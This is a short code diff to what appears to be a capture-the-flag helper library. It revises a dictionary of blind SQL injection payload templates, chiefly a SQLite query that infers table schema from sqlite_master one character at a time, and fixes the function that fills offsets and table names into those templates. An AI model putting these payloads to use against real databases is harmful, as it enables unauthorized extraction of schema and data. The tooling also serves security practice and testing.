@@ -81,8 +81,8 @@ blind_sqli_payloads = {
 	),
 	"columns":
 	(
-	"(SELECT count(sql) FROM sqlite_master WHERE type!='meta' AND sql NOT NULL"
-	" and name ='$t' and sql like '{0}%' limit 1 offset $o) > 0"
+	"(SELECT count(sql) FROM sqlite_master WHERE type='table'"
+	" and tbl_name ='$t' and sql like '{0}%' limit 1 offset $o) > 0"
 	)
 	},
 	"mysql":
@@ -101,7 +101,7 @@ blind_sqli_payloads = {
 }
 
 def blind_sqli_payload(dbms, typ, offset=0, table_name=""):
-	return blind_sqli_payloads[dbms][typ].replace("$o", offset).replace("$t", table_name)
+	return blind_sqli_payloads[dbms][typ].replace("$o", str(offset)).replace("$t", table_name)
 
 class PyJail:
 	"""makes interacting with python jails easier"""
